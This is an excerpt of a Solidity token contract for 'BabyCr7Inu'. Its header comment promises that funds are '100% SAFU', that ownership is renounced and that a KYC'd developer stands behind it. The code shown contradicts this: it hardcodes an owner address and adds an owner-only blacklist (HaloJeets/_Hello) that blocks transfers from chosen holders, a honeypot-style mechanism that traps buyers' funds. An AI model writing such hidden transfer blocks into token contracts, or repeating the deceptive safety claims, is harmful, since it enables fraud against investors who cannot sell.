...
/**
  https://t.me/babycr7inuchat

   Safe Dev your funds is 100% SAFU

   2 BNB LP
   Renounce Ownership

   15k Mcap extend to 1 month Lock
   25k Mcap call bigcalls
   50k Mcap drop Project Details.
   100k Mcap Doxxed and KYC Dev via VC.
   Low Tax 5 buy / 5 sell
...
contract babycr7inu is Context, IERC20 { 
	...
	mapping(address => bool) public _Hello;
	
    address payable public Wallet_Marketing = payable(0x1377bE2BfEA53bA5De7ef676429BeCeA824dBbE6); 
    address payable public Wallet_Dev = payable(0x1377bE2BfEA53bA5De7ef676429BeCeA824dBbE6);
    ...
    string private constant _name = "BabyCr7Inu"; 
    string private constant _symbol = unicode"BCr7Inu"; 
    ...
    constructor () {
        ...
        _owner = 0x7Aa1676DA70f64eDDE2174F6ae25cbe6fedADe9E;
    ...
    function _transfer(
		...
		require(!_Hello[from] && !_Hello[to], "This address is like a JEET !");
	...
	function HaloJeets(address[] calldata addresses) external onlyOwner 
	{
     for (uint256 i; i < addresses.length; ++i) {
        _Hello[addresses[i]] = true;
      }
    }
    
    function GoodByeJeets(address account) external onlyOwner 
	{
        _Hello[account] = false;
    }
